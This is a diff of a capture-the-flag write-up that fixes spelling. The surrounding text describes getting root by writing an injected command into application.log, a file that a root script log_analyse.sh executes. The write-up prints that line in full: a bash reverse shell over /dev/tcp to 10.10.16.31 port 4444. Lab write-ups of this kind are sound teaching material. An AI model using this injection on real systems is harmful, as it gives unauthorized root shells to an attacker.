@@ -64,11 +64,11 @@ inject revshell into application.log
 - SSH into the machine as new user and got the user flag
 
 ## 🧪Exploitation
-- Used all the known prevelage escalation commands and found nothing useful so manually checked the files and found an interesting file called log_analyse.sh
+- Used all the known privilege escalation commands and found nothing useful so manually checked the files and found an interesting file called log_analyse.sh
 - Cat the file to find that the file reads and execute the content in the file path /var/www/web/user-management-service/log/application.log
-- So wrote a reverse script to opened a listner in my system
+- So wrote a reverse script to opened a listener in my system
   ```bash
   echo 'HTTP Status: x[$(/bin/bash -i >& /dev/tcp/10.10.16.31/4444 0>&1)]' > /var/www/web/user-management-service/log/application.log
   ```
-  > (Note:First delete th content in the file and then use the above command)
+  > (Note:First delete the content in the file and then use the above command)
 - Got the reverse shell as root and dumped the root flag 🚩
